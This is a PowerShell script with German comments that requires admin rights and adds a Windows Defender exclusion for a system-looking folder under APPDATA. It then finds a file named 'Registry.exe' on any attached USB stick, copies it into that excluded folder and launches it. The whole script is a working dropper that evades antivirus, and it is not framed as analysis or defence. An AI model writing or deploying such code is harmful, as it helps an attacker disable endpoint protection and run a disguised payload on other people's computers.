# Sicherstellen, dass das Skript mit Admin-Rechten läuft
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Bitte führe das Skript als Administrator aus!"
    exit
}

# Zielordner dynamisch bestimmen (aktueller Benutzer)
$zielOrdner = Join-Path $env:APPDATA "Microsoft\Windows"
if (-not (Test-Path $zielOrdner)) {
    Write-Host "Zielordner $zielOrdner existiert nicht, wird erstellt..."
    New-Item -Path $zielOrdner -ItemType Directory -Force
}

# Defender-Ausnahme für Zielordner hinzufügen (wichtig: zuerst machen)
Write-Host "Füge Defender-Ausnahme für $zielOrdner hinzu"
Add-MpPreference -ExclusionPath $zielOrdner

# USB-Sticks auslesen
Write-Host "Suche nach angeschlossenen USB-Sticks..."
$usbDrives = Get-WmiObject -Query "SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'"

if (-not $usbDrives) {
    Write-Warning "Keine USB-Sticks gefunden."
    exit
}

$gefunden = $false

foreach ($drive in $usbDrives) {
    $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"
    foreach ($partition in $partitions) {
        $logicalDisks = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass = Win32_LogicalDiskToPartition"
        foreach ($logicalDisk in $logicalDisks) {
            $driveLetter = $logicalDisk.DeviceID + "\"
            $quelleDatei = Join-Path $driveLetter "Registry.exe"
            if (Test-Path $quelleDatei) {
                Write-Host "Datei Registry.exe gefunden auf Laufwerk $driveLetter"
                $zielDatei = Join-Path $zielOrdner "Registry.exe"
                Write-Host "Kopiere Registry.exe nach $zielDatei"
                Copy-Item -Path $quelleDatei -Destination $zielDatei -Force
                $gefunden = $true
                break
            }
        }
        if ($gefunden) { break }
    }
    if ($gefunden) { break }
}

if (-not $gefunden) {
    Write-Warning "Registry.exe wurde auf keinem USB-Stick gefunden."
    exit
}

# Datei ausführen
$ausfuehrPfad = Join-Path $zielOrdner "Registry.exe"
if (Test-Path $ausfuehrPfad) {
    Write-Host "Starte Datei $ausfuehrPfad"
    Start-Process -FilePath $ausfuehrPfad
} else {
    Write-Warning "Datei zum Ausführen nicht gefunden: $ausfuehrPfad"
}
